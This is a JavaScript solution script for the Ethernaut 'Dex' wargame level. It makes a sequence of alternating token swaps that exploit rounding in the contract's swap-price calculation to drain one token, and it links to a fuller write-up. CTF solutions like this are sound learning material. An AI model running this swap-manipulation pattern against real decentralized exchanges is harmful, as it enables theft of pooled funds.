/*
    Quite Easy if you don't feel trying it out in depth in Remix..
    Well, here's the full explanation of code -> https://dev.to/nvn/ethernaut-hacks-level-22-dex-1e18

    Summary (If you feel yourself well verse and is close to the answer):
    - It's nothing just taking the benefit of swap `getSwapPrice()` function, if you notice the calculation is a bit risky cuz DEX's always use floating point numbers or some external oracles in order to calculate token prices which kind of give them some accurate prices..but here that's the flaw
*/ 

// Just follow this code

// Providing enough tokens to the contract
await contract.approve(contract.address, 500)

// assigning token addresses to variables
const t1 = await contract.token1()
const t2 = await contract.token2()

// here are the swaps
await contract.swap(t1, t2, 10)
await contract.swap(t2, t1, 20)
await contract.swap(t1, t2, 24)
await contract.swap(t2, t1, 30)
await contract.swap(t1, t2, 41)
await contract.swap(t2, t1, 45)

// Now let's check how much token1 is with us
await contract.balanceOf(t1, player) // -> 110

// Submit 